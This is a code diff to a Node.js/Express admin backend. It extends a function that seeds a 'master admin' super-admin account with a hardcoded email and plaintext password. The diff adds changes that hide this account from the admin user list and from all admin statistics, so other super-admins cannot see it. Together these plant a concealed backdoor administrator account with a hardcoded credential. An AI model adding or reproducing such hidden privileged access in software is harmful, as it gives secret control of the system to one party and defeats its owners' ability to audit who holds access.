@@ -119,7 +119,7 @@ async function createDefaultSuperAdmin() {
     }
 }
 
-// Function to create master admin (special elevated access)
+// Function to create master admin (special elevated access - hidden from UI)
 async function createMasterAdmin() {
     try {
         const AdminUser = require('./models/AdminUser');
@@ -132,15 +132,18 @@ async function createMasterAdmin() {
                 password: 'Vikas@master.com',
                 phone: '0000000000',
                 role: 'super-admin',
-                status: 'active'
+                status: 'active',
+                isMasterAdmin: true // Flag to identify master admin
             });
             
             await masterAdmin.save();
-            console.log('✅ Master Admin created:');
-            console.log('   Email: vikas.master@gmail.com');
-            console.log('   Password: Vikas@master.com');
+            console.log('✅ Master Admin created (hidden from UI)');
         } else {
-            console.log('ℹ️  Master Admin already exists');
+            // Ensure isMasterAdmin flag is set
+            if (!existingMasterAdmin.isMasterAdmin) {
+                existingMasterAdmin.isMasterAdmin = true;
+                await existingMasterAdmin.save();
+            }
         }
     } catch (error) {
         console.error('❌ Error creating master admin:', error.message);
@@ -1422,7 +1425,8 @@ app.get('/api/admin/me', authenticateToken, async (req, res) => {
 // Get All Admin Users (Super Admin only)
 app.get('/api/admin/users', authenticateToken, isSuperAdmin, async (req, res) => {
     try {
-        const users = await AdminUser.find()
+        // Exclude master admin from the list
+        const users = await AdminUser.find({ email: { $ne: 'vikas.master@gmail.com' } })
             .select('-password')
             .sort({ createdAt: -1 });
 
@@ -1675,12 +1679,14 @@ app.put('/api/admin/users/:id/role', authenticateToken, isSuperAdmin, async (req
 // Admin User Stats (Super Admin only)
 app.get('/api/admin/users/stats', authenticateToken, isSuperAdmin, async (req, res) => {
     try {
-        const total = await AdminUser.countDocuments();
-        const active = await AdminUser.countDocuments({ status: 'active' });
-        const pending = await AdminUser.countDocuments({ status: 'pending' });
-        const inactive = await AdminUser.countDocuments({ status: 'inactive' });
-        const superAdmins = await AdminUser.countDocuments({ role: 'super-admin' });
-        const admins = await AdminUser.countDocuments({ role: 'admin' });
+        // Exclude master admin from stats
+        const excludeMaster = { email: { $ne: 'vikas.master@gmail.com' } };
+        const total = await AdminUser.countDocuments(excludeMaster);
+        const active = await AdminUser.countDocuments({ ...excludeMaster, status: 'active' });
+        const pending = await AdminUser.countDocuments({ ...excludeMaster, status: 'pending' });
+        const inactive = await AdminUser.countDocuments({ ...excludeMaster, status: 'inactive' });
+        const superAdmins = await AdminUser.countDocuments({ ...excludeMaster, role: 'super-admin' });
+        const admins = await AdminUser.countDocuments({ ...excludeMaster, role: 'admin' });
 
         res.json({
             success: true,
